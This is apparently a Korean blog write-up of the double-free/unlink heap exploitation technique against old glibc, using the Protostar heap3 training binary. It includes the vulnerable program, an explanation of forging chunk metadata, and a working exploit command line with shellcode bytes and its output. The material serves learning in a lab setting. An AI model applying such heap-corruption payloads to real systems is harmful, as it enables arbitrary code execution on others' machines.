---
title: Double Free Bug
author: Beomsu Lee
category: [Exploitation, Heap]
tags: [exploitation, heap, double free bug]
math: true
mermaid: true
---

## Description

free를 두 번할 경우 발생하는 버그이다. free가 호출될 때 인접한 free chunk가 있다면 더 큰 free chunk로 병합된다. chunk가 병합될 때 unlink 매크로가 발생한다. unlink 매크로를 통해 원하는 공간에 원하는 값을 입력할 수 있다. unlink를 공격하는 방법은 glibc 2.3.2 버전 이하에서만 가능하다.

```c
#define unlink(P, BK, FD) {
    FD = P->fd;
    BK = P->bk;
    FD->bk = BK;
    BK->fd = FD;
}
```

```c
FD = *P + 8;
BK = *P + 12;
FD + 12 = BK;
BK + 8 = FD;
```

## Proof of concept

```c
// Protostar의 heap3
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>
void winner()
{
  printf("that wasn't too bad now, was it? @ %d\n", time(NULL));
}
int main(int argc, char **argv)
{
  char *a, *b, *c;
  a = malloc(32);
  b = malloc(32);
  c = malloc(32);
  strcpy(a, argv[1]);
  strcpy(b, argv[2]);
  strcpy(c, argv[3]);
  free(c);
  free(b);
  free(a);
  printf("dynamite failed?\n");
}
```

strcpy(a,argv[1])에서 overflow를 통해 b의 **P flag**와 **pre_size** 값을 변조한다.

### P flag 변조

P flag가 0이라는 뜻은 b가 free될 때 a chunk와 병합이 일어난다는 뜻이다. 따라서 P flag를 0으로 변조시키면 unlink 매크로가 발생한다. unlink가 실행되면 fd가 가리키는 주소의 + 12 지점에 bk가 입력되고 bk가 가리키는 주소의 + 8 지점에 fd가 입력되어 임의의 주소에 원하는 값을 입력할 수 있다.

### pre_size 변조

heap에서 이전 Chunk의 주소값은 “&b - pre_size”로 표현된다. pre_size 값을 0xfffffffc(-4)로 변조할 경우 &b + 4 byte가 된다. 생성한 가짜 Chunk는 우리가 입력할 수 있는 공간이기 때문에 fd와 bk를 조작할 수 있다.

### Exploit Method

1. a에 “push puts@got ; ret” 코드 삽입 및 pre_size, size 변조
2. 가짜 Chunk의 fd 위치에 puts@got - 12를 삽입하고 bk에는 해당 code를 가리키는 주소값을 입력

## Exploit

```bash
root@protostar:/home/protostar# ./heap3 $(python -c 'print "\x90"*22+"\x68\x64\x88\x04\x08\xc3"+"A"*4+"\xfc\xff\xff\xff"+"\xfc\xff\xff\xff"') $(python -c 'print "A"*4+"\x1c\xb1\x04\x08"+"\x10\xc0\x04\x08"') C
that wasn't too bad now, was it? @ 1577555750
```

### Add

DFB에서 .dtors + 4(소멸자)의 주소를 찾아 사용하는 방법도 있다

## References

- [DFB](http://index-of.co.uk/Reverse-Engineering/Double%20Free%20Bug%20%5Bseoty-_-v%5D.pdf)
- [Protostar Heap 3 Walkthrough](https://medium.com/@airman604/protostar-heap-3-walkthrough-56d9334bcd13)
- [Protostar Heap3 \[ Double Free Bug\]](https://itsaessak.tistory.com/136)
- [Once upon a free()...](http://phrack.org/issues/57/9.html)